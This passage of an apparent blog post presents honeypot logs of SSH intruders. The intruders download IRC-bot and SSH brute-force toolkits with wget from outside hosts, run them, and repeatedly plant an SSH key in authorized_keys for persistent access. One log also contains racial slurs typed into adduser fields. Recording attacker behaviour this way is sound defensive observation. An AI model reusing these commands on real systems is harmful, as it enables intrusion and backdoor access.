<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span>
<span class="nv">lib</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="o">/</span><span class="nv">dev</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span># <span class="nv">wget</span> <span class="nv">freewebtown</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">pacalici</span><span class="o">/</span><span class="nv">bf</span>.<span class="nv">tgz</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">09</span> <span class="mi">00</span>:<span class="mi">32</span>:<span class="mi">05</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">freewebtown</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">pacalici</span><span class="o">/</span><span class="nv">bf</span>.<span class="nv">tgz</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">freewebtown</span>.<span class="nv">com</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">392378</span> <span class="ss">(</span><span class="mi">383</span><span class="nv">K</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">x</span><span class="o">-</span><span class="nv">tar</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">bf</span>.<span class="nv">tgz</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">392</span>,<span class="mi">378</span>      <span class="mi">9</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">39</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">09</span> <span class="mi">00</span>:<span class="mi">32</span>:<span class="mi">06</span> <span class="ss">(</span><span class="mi">9</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">bf</span>.<span class="nv">tgz</span><span class="s1">&#39;</span><span class="s"> saved [392378/392378]</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span># <span class="nv">tar</span> <span class="nv">zxvf</span> <span class="nv">bf</span>.<span class="nv">tgz</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">go</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">cyc</span>.<span class="nv">set</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">cyc</span>.<span class="nv">help</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">cyc</span>.<span class="nv">levels</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">bash</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">udp</span>.<span class="nv">pl</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">stealth</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randkicks</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randaway</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randsignoff</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randinsult</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randversions</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randsay</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randpickup</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">randfiles</span><span class="o">/</span><span class="nv">randnicks</span>.<span class="nv">e</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">cyc</span>.<span class="nv">acc</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">pico</span>.<span class="nv">tgz</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">pico</span>
<span class="nv">mc</span><span class="o">-</span><span class="nv">root</span><span class="o">/</span><span class="nv">cyc</span>.<span class="nv">pid</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span># <span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> <span class="nv">bf</span>.<span class="nv">tgz</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span>#

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span># <span class="nv">cd</span> <span class="nv">mc</span><span class="o">-</span><span class="nv">root</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">mc</span><span class="o">-</span><span class="nv">root</span># .<span class="o">/</span><span class="nv">go</span>
<span class="nv">unable</span> <span class="nv">to</span> <span class="nv">open</span> <span class="nv">display</span> <span class="s2">&quot;</span><span class="s">:0</span><span class="s2">&quot;</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">mc</span><span class="o">-</span><span class="nv">root</span># <span class="nv">ls</span>
<span class="nv">go</span>         <span class="nv">cyc</span>.<span class="nv">set</span>    <span class="nv">cyc</span>.<span class="nv">help</span>   <span class="nv">cyc</span>.<span class="nv">levels</span> <span class="nv">bash</span>       <span class="nv">udp</span>.<span class="nv">pl</span>     <span class="nv">stealth</span>
<span class="nv">randfiles</span>  <span class="nv">cyc</span>.<span class="nv">acc</span>    <span class="nv">pico</span>.<span class="nv">tgz</span>   <span class="nv">pico</span>       <span class="nv">cyc</span>.<span class="nv">pid</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">mc</span><span class="o">-</span><span class="nv">root</span># <span class="nv">cd</span>

<span class="nv">server</span>:<span class="o">~</span>#

<span class="nv">server</span>:<span class="o">~</span>#

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span> <span class="nv">pibo</span>.<span class="nv">com</span><span class="o">/</span>.<span class="nv">x</span><span class="o">/</span><span class="nv">scan</span><span class="o">/</span><span class="nv">wtf</span>.<span class="nv">tar</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">09</span> <span class="mi">00</span>:<span class="mi">35</span>:<span class="mi">09</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">pibo</span>.<span class="nv">com</span><span class="o">/</span>.<span class="nv">x</span><span class="o">/</span><span class="nv">scan</span><span class="o">/</span><span class="nv">wtf</span>.<span class="nv">tar</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">pibo</span>.<span class="nv">com</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">1574103</span> <span class="ss">(</span><span class="mi">1</span><span class="nv">M</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">x</span><span class="o">-</span><span class="nv">tar</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">wtf</span>.<span class="nv">tar</span>

<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">1</span>,<span class="mi">574</span>,<span class="mi">103</span>    <span class="mi">299</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">1</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">09</span> <span class="mi">00</span>:<span class="mi">35</span>:<span class="mi">13</span> <span class="ss">(</span><span class="mi">299</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">wtf</span>.<span class="nv">tar</span><span class="s1">&#39;</span><span class="s"> saved [1574103/1574103]</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">tar</span> <span class="nv">xzvf</span> <span class="nv">wtf</span>.<span class="nv">tar</span>
<span class="nv">wtf</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">a</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">a1</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">auto</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">common</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">gen</span><span class="o">-</span><span class="nv">pass</span>.<span class="nv">sh</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">go</span>.<span class="nv">sh</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">pass_file</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">pscan2</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">scam</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">sh</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">ss</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">ssh</span><span class="o">-</span><span class="nv">scan</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">start</span>
<span class="nv">wtf</span><span class="o">/</span><span class="nv">vuln</span>.<span class="nv">txt</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="nv">wtf</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">wtf</span># <span class="nv">chmod</span> <span class="o">+</span><span class="nv">x</span> <span class="o">*</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">wtf</span># .<span class="o">/</span><span class="nv">a</span> <span class="mi">100</span>
<span class="nv">error</span> <span class="k">while</span> <span class="nv">loading</span> <span class="nv">shared</span> <span class="nv">libraries</span>: <span class="nv">libgnome</span>.<span class="nv">so</span>.<span class="mi">32</span>: <span class="nv">cannot</span> <span class="nv">open</span> <span class="nv">shared</span> <span class="nv">object</span> <span class="nv">file</span>: <span class="nv">No</span> <span class="nv">such</span> <span class="nv">file</span> <span class="nv">or</span> <span class="nv">directory</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">wtf</span>#
</pre></div>


<h2>Seventh&nbsp;example</h2>
<p>Not only is this intruder very offensive, he also quickly spotted the&nbsp;honeypot.</p>
<div class="highlight"><pre><span></span><span class="nv">server</span>:<span class="o">~</span># <span class="nv">adduser</span> <span class="nv">nigger</span>
<span class="nv">Adding</span> <span class="nv">user</span> `<span class="nv">nigger</span><span class="s1">&#39;</span><span class="s"> ...</span>
<span class="nv">Adding</span> <span class="nv">new</span> <span class="nv">group</span> `<span class="nv">nigger</span><span class="s1">&#39;</span><span class="s"> (1001) ...</span>
<span class="nv">Adding</span> <span class="nv">new</span> <span class="nv">user</span> `<span class="nv">nigger</span><span class="s1">&#39;</span><span class="s"> (1001) with group `nigger</span><span class="s1">&#39;</span> ...
<span class="nv">Creating</span> <span class="nv">home</span> <span class="nv">directory</span> `<span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">nigger</span><span class="s1">&#39;</span><span class="s"> ...</span>
<span class="nv">Copying</span> <span class="nv">files</span> <span class="nv">from</span> `<span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">skel</span><span class="s1">&#39;</span><span class="s"> ...</span>
<span class="nv">Password</span>:
<span class="nv">Password</span> <span class="nv">again</span>:

<span class="nv">Changing</span> <span class="nv">the</span> <span class="nv">user</span> <span class="nv">information</span> <span class="k">for</span> <span class="nv">nigger</span>

<span class="nv">Enter</span> <span class="nv">the</span> <span class="nv">new</span> <span class="nv">value</span>, <span class="nv">or</span> <span class="nv">press</span> <span class="nv">ENTER</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">default</span>

        <span class="nv">Username</span> []:
<span class="nv">Must</span> <span class="nv">enter</span> <span class="nv">a</span> <span class="nv">value</span><span class="o">!</span>
        <span class="nv">Username</span> []: <span class="nv">only</span>
        <span class="nv">Full</span> <span class="nv">Name</span> []: <span class="nv">dumb</span>
        <span class="nv">Room</span> <span class="nv">Number</span> []: <span class="nv">niggers</span>
        <span class="nv">Work</span> <span class="nv">Phone</span> []: <span class="nv">use</span>
        <span class="nv">Home</span> <span class="nv">Phone</span> []: <span class="nv">honeypot</span>
        <span class="nv">Mobile</span> <span class="nv">Phone</span> []: <span class="nv">you</span>
        <span class="nv">Country</span> []: <span class="nv">stupid</span>
        <span class="nv">City</span> []: <span class="nv">nigger</span>
        <span class="nv">Language</span> []: <span class="nv">HA</span>
        <span class="nv">Favorite</span> <span class="nv">movie</span> []: <span class="nv">HA</span>
        <span class="nv">Other</span> []: <span class="nv">HA</span>
<span class="nv">Is</span> <span class="nv">the</span> <span class="nv">information</span> <span class="nv">correct</span>? [<span class="nv">Y</span><span class="o">/</span><span class="nv">n</span>] <span class="nv">y</span>
<span class="nv">ERROR</span>: <span class="nv">Some</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">information</span> <span class="nv">you</span> <span class="nv">entered</span> <span class="nv">is</span> <span class="nv">invalid</span>
<span class="nv">Deleting</span> <span class="nv">user</span> `<span class="nv">nigger</span><span class="s1">&#39;</span><span class="s"> ...</span>
<span class="nv">Deleting</span> <span class="nv">group</span> `<span class="nv">nigger</span><span class="s1">&#39;</span><span class="s"> (1001) ...</span>
<span class="nv">Deleting</span> <span class="nv">home</span> <span class="nv">directory</span> `<span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">nigger</span><span class="s1">&#39;</span><span class="s"> ...</span>
<span class="nv">Try</span> <span class="nv">again</span>? [<span class="nv">Y</span><span class="o">/</span><span class="nv">n</span>] <span class="nv">n</span>
</pre></div>


<h2>Eight&nbsp;example</h2>
<p>This guy tried adding his <span class="caps">SSH</span> keys and installing software again and again and was one of the most persistent&nbsp;intruders.</p>
<div class="highlight"><pre><span></span><span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="o">/</span><span class="nv">root</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.          ..         <span class="nv">sys</span>        <span class="nv">bin</span>        <span class="nv">mnt</span>        <span class="nv">media</span>      <span class="nv">vmlinuz</span>
<span class="nv">opt</span>        <span class="nv">cdrom</span>      <span class="nv">selinux</span>    <span class="nv">tmp</span>        <span class="nv">proc</span>       <span class="nv">sbin</span>       <span class="nv">etc</span>
<span class="nv">dev</span>        <span class="nv">srv</span>        <span class="nv">initrd</span>.<span class="nv">img</span> <span class="nv">lib</span>        <span class="nv">home</span>       <span class="nv">var</span>        <span class="nv">usr</span>
<span class="nv">boot</span>       <span class="nv">root</span>       <span class="nv">lost</span><span class="o">+</span><span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">cd</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">mkdir</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">echo</span> <span class="nv">ssh</span><span class="o">-</span><span class="nv">rsa</span> <span class="nv">AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH</span><span class="o">+</span><span class="nv">iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed</span><span class="o">/</span><span class="nv">FONEcnZFVo0eTkaZ</span><span class="o">+</span><span class="nv">xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf</span><span class="o">+</span><span class="nv">I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ</span><span class="o">==</span> <span class="nv">rsa</span><span class="o">-</span><span class="nv">key</span><span class="o">-</span><span class="mi">20080201</span> <span class="o">&gt;&gt;</span> <span class="o">~/</span>.<span class="nv">ssh</span><span class="o">/</span><span class="nv">authorized_keys</span><span class="c1">; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys</span>
<span class="nv">ssh</span><span class="o">-</span><span class="nv">rsa</span> <span class="nv">AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH</span><span class="o">+</span><span class="nv">iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed</span><span class="o">/</span><span class="nv">FONEcnZFVo0eTkaZ</span><span class="o">+</span><span class="nv">xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf</span><span class="o">+</span><span class="nv">I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ</span><span class="o">==</span> <span class="nv">rsa</span><span class="o">-</span><span class="nv">key</span><span class="o">-</span><span class="mi">20080201</span> <span class="o">&gt;&gt;</span> <span class="o">~/</span>.<span class="nv">ssh</span><span class="o">/</span><span class="nv">authorized_keys</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">ls</span>  <span class="o">-</span><span class="nv">a</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">dir</span>
<span class="nv">bash</span>: <span class="nv">dir</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>   .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> .<span class="nv">root</span>
<span class="nv">bash</span>: <span class="nv">cd</span>: .<span class="nv">root</span>: <span class="nv">No</span> <span class="nv">such</span> <span class="nv">file</span> <span class="nv">or</span> <span class="nv">directory</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="o">/</span><span class="nv">root</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">mkdir</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">echo</span> <span class="nv">ssh</span><span class="o">-</span><span class="nv">rsa</span> <span class="nv">AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH</span><span class="o">+</span><span class="nv">iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed</span><span class="o">/</span><span class="nv">FONEcnZFVo0eTkaZ</span><span class="o">+</span><span class="nv">xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf</span><span class="o">+</span><span class="nv">I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ</span><span class="o">==</span> <span class="nv">rsa</span><span class="o">-</span><span class="nv">key</span><span class="o">-</span><span class="mi">20080201</span> <span class="o">&gt;&gt;</span> <span class="o">~/</span>.<span class="nv">ssh</span><span class="o">/</span><span class="nv">authorized_keys</span><span class="c1">; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys</span>
<span class="nv">ssh</span><span class="o">-</span><span class="nv">rsa</span> <span class="nv">AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH</span><span class="o">+</span><span class="nv">iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed</span><span class="o">/</span><span class="nv">FONEcnZFVo0eTkaZ</span><span class="o">+</span><span class="nv">xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf</span><span class="o">+</span><span class="nv">I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ</span><span class="o">==</span> <span class="nv">rsa</span><span class="o">-</span><span class="nv">key</span><span class="o">-</span><span class="mi">20080201</span> <span class="o">&gt;&gt;</span> <span class="o">~/</span>.<span class="nv">ssh</span><span class="o">/</span><span class="nv">authorized_keys</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>   .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.          ..         <span class="nv">sys</span>        <span class="nv">bin</span>        <span class="nv">mnt</span>        <span class="nv">media</span>      <span class="nv">vmlinuz</span>
<span class="nv">opt</span>        <span class="nv">cdrom</span>      <span class="nv">selinux</span>    <span class="nv">tmp</span>        <span class="nv">proc</span>       <span class="nv">sbin</span>       <span class="nv">etc</span>
<span class="nv">dev</span>        <span class="nv">srv</span>        <span class="nv">initrd</span>.<span class="nv">img</span> <span class="nv">lib</span>        <span class="nv">home</span>       <span class="nv">var</span>        <span class="nv">usr</span>
<span class="nv">boot</span>       <span class="nv">root</span>       <span class="nv">lost</span><span class="o">+</span><span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">cd</span> <span class="nv">home</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">home</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.       ..      <span class="nv">richard</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">home</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.          ..         <span class="nv">sys</span>        <span class="nv">bin</span>        <span class="nv">mnt</span>        <span class="nv">media</span>      <span class="nv">vmlinuz</span>
<span class="nv">opt</span>        <span class="nv">cdrom</span>      <span class="nv">selinux</span>    <span class="nv">tmp</span>        <span class="nv">proc</span>       <span class="nv">sbin</span>       <span class="nv">etc</span>
<span class="nv">dev</span>        <span class="nv">srv</span>        <span class="nv">initrd</span>.<span class="nv">img</span> <span class="nv">lib</span>        <span class="nv">home</span>       <span class="nv">var</span>        <span class="nv">usr</span>
<span class="nv">boot</span>       <span class="nv">root</span>       <span class="nv">lost</span><span class="o">+</span><span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">mkdir</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">cd</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">echo</span> <span class="nv">ssh</span><span class="o">-</span><span class="nv">rsa</span> <span class="nv">AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH</span><span class="o">+</span><span class="nv">iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed</span><span class="o">/</span><span class="nv">FONEcnZFVo0eTkaZ</span><span class="o">+</span><span class="nv">xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf</span><span class="o">+</span><span class="nv">I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ</span><span class="o">==</span> <span class="nv">rsa</span><span class="o">-</span><span class="nv">key</span><span class="o">-</span><span class="mi">20080201</span> <span class="o">&gt;&gt;</span> <span class="o">~/</span>.<span class="nv">ssh</span><span class="o">/</span><span class="nv">authorized_keys</span><span class="c1">; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys</span>
<span class="nv">ssh</span><span class="o">-</span><span class="nv">rsa</span> <span class="nv">AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH</span><span class="o">+</span><span class="nv">iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed</span><span class="o">/</span><span class="nv">FONEcnZFVo0eTkaZ</span><span class="o">+</span><span class="nv">xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf</span><span class="o">+</span><span class="nv">I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ</span><span class="o">==</span> <span class="nv">rsa</span><span class="o">-</span><span class="nv">key</span><span class="o">-</span><span class="mi">20080201</span> <span class="o">&gt;&gt;</span> <span class="o">~/</span>.<span class="nv">ssh</span><span class="o">/</span><span class="nv">authorized_keys</span>

<span class="nv">server</span>:<span class="o">/</span>.<span class="nv">ssh</span># <span class="nv">cd</span> ..

<span class="nv">server</span>:<span class="o">/</span># <span class="c1">;s =a</span>
<span class="nv">bash</span>: <span class="nv">s</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">/</span>#

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.          ..         <span class="nv">sys</span>        <span class="nv">bin</span>        <span class="nv">mnt</span>        <span class="nv">media</span>      <span class="nv">vmlinuz</span>
<span class="nv">opt</span>        <span class="nv">cdrom</span>      <span class="nv">selinux</span>    <span class="nv">tmp</span>        <span class="nv">proc</span>       <span class="nv">sbin</span>       <span class="nv">etc</span>
<span class="nv">dev</span>        <span class="nv">srv</span>        <span class="nv">initrd</span>.<span class="nv">img</span> <span class="nv">lib</span>        <span class="nv">home</span>       <span class="nv">var</span>        <span class="nv">usr</span>
<span class="nv">boot</span>       <span class="nv">root</span>       <span class="nv">lost</span><span class="o">+</span><span class="nv">found</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> .<span class="nv">ssh</span>

<span class="nv">server</span>:<span class="o">/</span># <span class="nv">cd</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> <span class="o">/</span><span class="nv">tmp</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">ICE</span><span class="o">-</span><span class="nv">unix</span> .<span class="nv">X11</span><span class="o">-</span><span class="nv">unix</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span># <span class="nv">mkdir</span> ,

<span class="nv">server</span>:<span class="o">/</span><span class="nv">tmp</span># <span class="nv">cd</span> ,
